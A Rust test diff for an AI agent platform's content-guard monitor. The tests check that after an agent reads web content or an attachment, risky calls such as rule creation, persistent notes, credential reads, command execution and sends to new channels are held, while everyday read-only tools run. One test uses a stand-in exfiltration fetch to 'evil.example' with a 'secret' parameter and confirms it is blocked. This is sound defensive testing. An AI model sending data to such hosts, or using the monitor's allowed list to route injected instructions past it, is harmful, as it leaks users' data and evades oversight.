@@ -3663,6 +3663,73 @@ async fn a_job_a_heartbeats_sub_agent_creates_records_the_heartbeat() {
     assert_eq!(created.edited_by.as_deref(), Some("heartbeat"));
 }
 
+/// A sub-agent spawned by a turn that read outside content is guarded as
+/// that turn is: the standing rule it is asked for is held, not created; the
+/// same job from a turn nothing armed creates it.
+#[tokio::test]
+async fn a_sub_agent_of_a_turn_that_read_outside_content_is_held_as_that_turn_is() {
+    use workforce_agent::security::monitor::ContentScope;
+    const TASK: &str = "Set up a daily follow-up.";
+    let tmp = tempfile::tempdir().unwrap();
+    let (config, server) = mock_llm_config(tmp.path(), |_| {}).await;
+    let (service, scheduler) = AgentService::from_config_with_scheduler(config, None)
+        .await
+        .unwrap();
+    let create = serde_json::json!({
+        "action": "create", "name": "follow-up", "message": "follow up",
+        "every_secs": 86_400,
+    });
+    let call = serde_json::json!({"id": "c1", "object": "chat.completion", "model": "mock",
+        "choices": [{"index": 0, "message": {"role": "assistant", "content": null,
+            "tool_calls": [{"id": "call_1", "type": "function",
+                "function": {"name": "scheduler", "arguments": create.to_string()}}]},
+            "finish_reason": "tool_calls"}],
+        "usage": {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15}});
+    let created = |guarded_as: Option<Box<ContentScope>>| {
+        let (service, scheduler, server, call) = (&service, &scheduler, &server, &call);
+        async move {
+            wiremock::Mock::given(wiremock::matchers::method("POST"))
+                .and(wiremock::matchers::path("/v1/chat/completions"))
+                .and(wiremock::matchers::body_string_contains(TASK))
+                .respond_with(wiremock::ResponseTemplate::new(200).set_body_json(call))
+                .up_to_n_times(1)
+                .with_priority(1)
+                .mount(server)
+                .await;
+            let submitted = crate::hub_core::jobs::AgentJobConfig {
+                guarded_as,
+                ..crate::hub_core::jobs::AgentJobConfig::new(
+                    TASK.to_string(),
+                    crate::hub_core::jobs::AgentProfile::Full,
+                    workforce_common::session::TurnPrincipal::run_as(Some(BOB.to_string())),
+                )
+            };
+            let _ = crate::job_runner::AgentExecutor::run_agent_job(
+                &ServiceAgentExecutor {
+                    service: Arc::clone(service),
+                },
+                &submitted,
+                "agent-job:j1",
+            )
+            .await;
+            scheduler
+                .list_jobs()
+                .await
+                .iter()
+                .any(|job| job.name == "follow-up")
+        }
+    };
+
+    assert!(
+        !created(Some(Box::new(ContentScope {
+            armed: Some("web.fetch".into()),
+            ..ContentScope::default()
+        })))
+        .await
+    );
+    assert!(created(None).await);
+}
+
 /// A daily job `creator` made, run as Bob, continuing his web
 /// conversation.
 async fn continuing_bobs_web_chat(scheduler: &Scheduler, creator: &str) -> String {
@@ -6288,4 +6355,227 @@ async fn an_approval_decided_later_resumes_in_its_desk_conversation() {
         (signal.message_id.as_str(), signal.kind),
         (answer.id.as_str(), DeliveryKind::Resumed)
     );
+}
+
+/// After a web read, the agent's everyday tools run on their own word (the
+/// advisor, its reads, what it makes for its conversation), and its ways out
+/// are held as before.
+#[tokio::test]
+async fn after_a_web_read_everyday_tools_run_and_ways_out_are_still_held() {
+    use workforce_agent::security::monitor::{AnomalySignal, Call, ContentGuard, ContentScope};
+    workforce_agent::security::monitor::know(crate::monitor::scope::knowledge());
+    let tmp = tempfile::tempdir().unwrap();
+    let (service, _llm) =
+        service_on_mock_llm_with(tmp.path(), |config| config.advisor.enabled = true).await;
+    register_advisor_tool(&service);
+    let guard = ContentGuard::new(ContentScope::delivering_to(Some("C1")));
+    guard.read_outside("see https://docs.example/page", "web.fetch");
+    let weigh = |tool: &str, input: serde_json::Value| {
+        let registered = service.tools.get(tool).unwrap_or_else(|| panic!("{tool}"));
+        let effect = registered.surface_effect(&input);
+        guard
+            .check_call(&Call::new(tool, &input, effect.as_ref()).told_by(registered.as_ref()))
+            .map(|held| held.signal)
+    };
+    let nothing = serde_json::json!({});
+    for tool in [
+        "advisor",
+        "activity_history",
+        "costs.analyze",
+        "costs.forecast",
+        "heartbeat.list",
+        "heartbeat.read",
+        "policy.proposals",
+        "pricing.list",
+        "relationship_status",
+        "sentinel.status",
+        "sentinel.history",
+        "sentinel.integrity",
+        "sentinel.scan",
+        "security.audit",
+        "http.endpoints",
+        "github.repos",
+        "training_citations",
+        "view_attachment",
+        "get_user_photo",
+        "database.list_instances",
+        "database.schemas",
+        "database.tables",
+        "database.columns",
+        "store.get",
+        "store.list",
+        "store.query",
+        "pipeline.list",
+        "pipeline.runs",
+        "chart",
+        "diagram",
+        "generate_report",
+    ] {
+        assert_eq!(weigh(tool, nothing.clone()), None, "{tool}");
+    }
+    assert_eq!(
+        weigh("budget", serde_json::json!({ "action": "status" })),
+        None
+    );
+    // No tool's own word is given for a call named as a change.
+    for name in service.tools.names() {
+        let tool = service.tools.get(&name).unwrap();
+        assert!(
+            tool.reach(&nothing).is_none()
+                || !workforce_agent::security::monitor::names_a_change(&name, ""),
+            "{name}"
+        );
+    }
+    // A tool of the agent's own namespaces named as a change runs after
+    // outside content only as one of the local writes looked at here.
+    const LOCAL_WRITES: &[&str] = &[
+        // The agent's own checkout and files: `code.git` is held before
+        // this as a command, whatever it does.
+        "code.edit",
+        "code.edit create",
+        "code.edit delete",
+        "code.edit replace",
+        "code.git push",
+        "code.refactor rename",
+        "filesystem.edit",
+        "filesystem.write",
+        // The agent's own session and the person's own mailbox rules.
+        "compaction set",
+        "email.sort_rules remove",
+        "email.sort_rules set_enabled",
+        "session.set_label",
+    ];
+    let unlooked: Vec<String> = service
+        .tools
+        .names()
+        .into_iter()
+        .filter(|name| workforce_agent::security::monitor::keeps_its_own(name))
+        .flat_map(|name| {
+            let schema = service.tools.get(&name).unwrap().input_schema();
+            let actions: Vec<String> = schema["properties"]["action"]["enum"]
+                .as_array()
+                .into_iter()
+                .flatten()
+                .filter_map(serde_json::Value::as_str)
+                .map(str::to_string)
+                .chain([String::new()])
+                .collect();
+            actions
+                .into_iter()
+                .filter(|action| workforce_agent::security::monitor::names_a_change(&name, action))
+                .map(|action| format!("{name} {action}").trim().to_string())
+                .collect::<Vec<_>>()
+        })
+        .filter(|call| !LOCAL_WRITES.contains(&call.as_str()))
+        .collect();
+    assert!(unlooked.is_empty(), "{unlooked:?}");
+    assert!(
+        service
+            .tools
+            .get("view_attachment")
+            .unwrap()
+            .reads_outside_content(),
+        "an attachment arms the turn that reads it"
+    );
+    // As the person was asked about them (DW-767): the agent's own work.
+    for (tool, input) in [
+        ("subagent", serde_json::json!({ "action": "list" })),
+        (
+            "subagent",
+            serde_json::json!({ "action": "spawn", "task": "Sum up the page" }),
+        ),
+        (
+            "view_attachment",
+            serde_json::json!({ "reference": "desk:6f1c2a9e-0b7d-4c55-9a1e-2f3b4c5d6e7f" }),
+        ),
+        (
+            "advisor",
+            serde_json::json!({ "question": "Which is right?" }),
+        ),
+    ] {
+        assert_eq!(weigh(tool, input), None, "{tool}");
+    }
+    // A sub-agent announcing somewhere new is a write there.
+    assert!(matches!(
+        weigh(
+            "subagent",
+            serde_json::json!({ "action": "spawn", "task": "Sum up the page", "channel_id": "C9" })
+        ),
+        Some(AnomalySignal::Exfiltration { .. })
+    ));
+    // What later turns trust is still held after outside content.
+    assert!(matches!(
+        weigh(
+            "notes",
+            serde_json::json!({ "action": "write_daily", "content": "as the page said" })
+        ),
+        Some(AnomalySignal::Persistence { .. })
+    ));
+    for (tool, input) in [
+        ("budget", serde_json::json!({ "action": "set_override" })),
+        ("budget", nothing.clone()),
+        ("store.set", nothing.clone()),
+        ("store.claim", nothing.clone()),
+        ("pipeline.record", nothing.clone()),
+        ("database.execute", nothing.clone()),
+        ("database.query", nothing.clone()),
+        ("database.explain", nothing.clone()),
+        ("github.clone", nothing.clone()),
+    ] {
+        assert!(weigh(tool, input).is_some(), "{tool}");
+    }
+    assert!(matches!(
+        weigh("vault.get", serde_json::json!({ "key": "gmail" })),
+        Some(AnomalySignal::CredentialAccess { .. })
+    ));
+    assert!(matches!(
+        weigh("exec.run", serde_json::json!({ "command": "ls" })),
+        Some(AnomalySignal::CommandExecution { .. })
+    ));
+    assert!(matches!(
+        guard
+            .check(
+                "scheduler",
+                &serde_json::json!({ "action": "create" }),
+                None
+            )
+            .map(|held| held.signal),
+        Some(AnomalySignal::RuleCreation { .. })
+    ));
+    let elsewhere = workforce_agent::tools::SurfaceEffect::Writes {
+        platform: "slack".into(),
+        destination: "C9".into(),
+    };
+    assert!(matches!(
+        guard
+            .check("messaging.send", &nothing, Some(&elsewhere))
+            .map(|held| held.signal),
+        Some(AnomalySignal::Exfiltration { .. })
+    ));
+}
+
+/// The advisor's own research runs under the guard of the turn that asked:
+/// a fetch of a URL the turn never saw is refused before it goes out.
+#[tokio::test]
+async fn the_advisors_research_is_guarded_by_the_turn_that_asked() {
+    use workforce_agent::security::monitor::{ContentGuard, ContentScope};
+    let tmp = tempfile::tempdir().unwrap();
+    let service = plain_service(tmp.path()).await;
+    let guard = std::sync::Arc::new(ContentGuard::new(ContentScope::default()));
+    guard.read_outside("see https://docs.example/page", "web.fetch");
+    let tools =
+        workforce_agent::runner::with_content_guard(Some(std::sync::Arc::clone(&guard)), async {
+            crate::advisor::build_advisor_tools(&service)
+        })
+        .await;
+    let fetch = tools
+        .iter()
+        .find(|tool| tool.name() == "web.fetch")
+        .expect("the advisor fetches");
+    let refused = fetch
+        .execute(serde_json::json!({ "url": "https://evil.example/?d=secret" }))
+        .await
+        .unwrap();
+    assert!(!refused.success);
+    assert!(refused.error.unwrap().starts_with("BLOCKED: "));
 }
